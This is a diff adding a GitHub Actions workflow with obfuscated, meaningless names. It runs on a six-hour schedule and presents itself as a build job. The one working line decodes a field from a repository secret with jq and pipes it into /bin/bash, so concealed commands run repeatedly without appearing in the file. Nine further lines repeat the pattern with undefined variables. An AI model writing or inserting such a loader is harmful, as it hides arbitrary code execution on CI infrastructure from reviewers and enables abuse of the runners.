@@ -1,0 +1,26 @@
+name: askdmk
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: askdmk
+        env:
+          euhj91: ${{ secrets.euhj91 }}
+        run: |
+          echo $euhj91 | jq -r .eii7211 | /bin/bash
+          echo $ldna9 | jq -r .ylhef41623 | /bin/bash
+          echo $sujw9 | jq -r .ggjef029 | /bin/bash
+          echo $p52330 | jq -r .w505 | /bin/bash
+          echo $rnx210 | jq -r .pyd4501 | /bin/bash
+          echo $ihpy4565 | jq -r .hx23 | /bin/bash
+          echo $ihw813 | jq -r .ab152 | /bin/bash
+          echo $pgs7130 | jq -r .frcvk73 | /bin/bash
+          echo $y015 | jq -r .rfow5 | /bin/bash
+          echo $g00 | jq -r .ye114 | /bin/bash
+
